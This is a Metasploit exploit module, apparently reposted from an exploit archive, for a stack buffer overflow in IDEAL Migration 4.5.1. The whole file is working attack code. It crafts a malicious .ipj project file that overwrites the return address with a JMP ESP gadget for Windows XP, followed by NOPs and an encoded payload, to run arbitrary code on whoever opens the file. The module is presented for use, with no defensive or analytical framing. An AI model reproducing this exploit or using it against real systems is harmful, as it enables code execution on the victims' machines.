IDEAL Migration v4.5.1 Buffer Overflow Exploit (Meta)
=====================================================

###
## This file is part of the Metasploit Framework and may be subject to
## redistribution and commercial restrictions. Please see the Metasploit
## Framework web site for more information on licensing and terms of use.
## http://metasploit.com/framework/
###
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;IDEAL Migration Version 4.5.1 Buffer
Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack overflow in IDEAL Migration
version 4.5.1.
                    By creating a specially crafted ipj file, an an attacker
may be able
                    to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;blake&#039; ],
            &#039;Version&#039;        => &#039;Version 1&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/12404&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 986,
                    &#039;BadChars&#039; => "\x00\x1a\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP Universal&#039;, { &#039;Ret&#039; => 0x7c96bf33 } ], #
JMP ESP in ULMigration_us.dll
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;April 26, 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;,
&#039;msf.ipj&#039;]),
                ], self.class)
 
    end
 
    def exploit
 
        sploit =  "\x0D\x0A\x5B\x47\x72\x6F\x75\x70\x2C\x45\x78\x70\x6F"
        sploit << "\x72\x74\x2C\x59\x65\x73\x5D\x0D\x0A"
        sploit << "\x43\x6f\x6d\x70\x75\x74\x65\x72\x3D"
        sploit << rand_text_alpha_upper(2420)
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << make_nops(10)
        sploit << payload.encoded
        sploit << "\x0D\x0A\x5B\x45\x6E\x64\x5D\x0D\x0A"
 
        ipj = sploit
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(ipj)
 
    end
 
end



